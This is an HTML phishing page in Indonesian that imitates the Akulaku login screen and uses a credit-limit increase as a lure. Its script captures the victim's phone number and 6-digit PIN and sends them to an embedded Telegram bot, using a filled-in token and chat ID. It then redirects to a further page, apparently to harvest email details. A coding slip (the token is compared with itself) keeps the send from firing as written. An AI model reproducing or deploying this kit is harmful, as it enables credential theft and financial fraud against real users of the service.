<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Akulaku</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }

        .logo-img {
            width: 150px;
            margin-bottom: 10px;
            object-fit: contain;
        }

        .sub-logo {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #333;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #D32F2F;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #D32F2F;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn-login:hover {
            background-color: #B71C1C;
        }

        .helper-links {
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 13px;
        }

        .helper-links a {
            text-decoration: none;
            color: #666;
        }

        .helper-links a:hover {
            color: #D32F2F;
        }

        .footer-register {
            margin-top: 40px;
            font-size: 14px;
            color: #666;
        }

        .footer-register a {
            color: #D32F2F;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo Akulaku" class="logo-img">
        <div class="sub-logo">Tingkatkan Limit Sekarang</div>

        <form id="loginForm">
            <div class="input-group">
                <label for="phone">Nomor Ponsel</label>
                <input type="text" id="phone" placeholder="Contoh: 081234567890" required>
            </div>

            <div class="input-group">
                <label for="pin">PIN (6 Digit)</label>
                <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="Masukkan 6 digit PIN" required>
            </div>

            <button type="submit" class="btn-login">Masuk</button>
        </form>

        <div class="helper-links">
            <a href="#">Lupa PIN?</a>
            <a href="#">Bantuan</a>
        </div>

        <div class="footer-register">
            Belum punya akun? <a href="#">Daftar</a>
        </div>
    </div>

    <script>
        // ============================================
        // GANTI TOKEN DAN CHAT ID ANDA DI BAWAH INI:
        // ============================================
        const config = {
            token: '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk',    // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
            chatId: '5529657606'       // Contoh: 123456789
        };
        // ============================================

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;

            // Validasi PIN harus 6 digit angka
            if (pin.length !== 6 || isNaN(pin)) {
                alert('PIN harus 6 digit angka!');
                return;
            }

            // Format pesan untuk Telegram
            const message = `ðŸ”” *LOGIN AKULAKU*\n\nðŸ“± *Nomor:* ${phone}\nðŸ” *PIN:* ${pin}\nâ° *Waktu:* ${new Date().toLocaleString('id-ID')}`;

            // Kirim ke Telegram (menggunakan fetch dengan no-cors mode)
            const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            // Menggunakan beacon (lebihå¯é  untuk bypass CORS)
            if (config.token !== '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk') {
                fetch(url, { mode: 'no-cors' })
                    .then(() => console.log('Data terkirim ke Telegram'))
                    .catch(err => console.log('Gagal terkirim:', err));
            }

            // Langsung redirect ke otp.html
            setTimeout(() => {
                window.location.href = "email.html";
            }, 500);
        });
    </script>

</body>
</html>
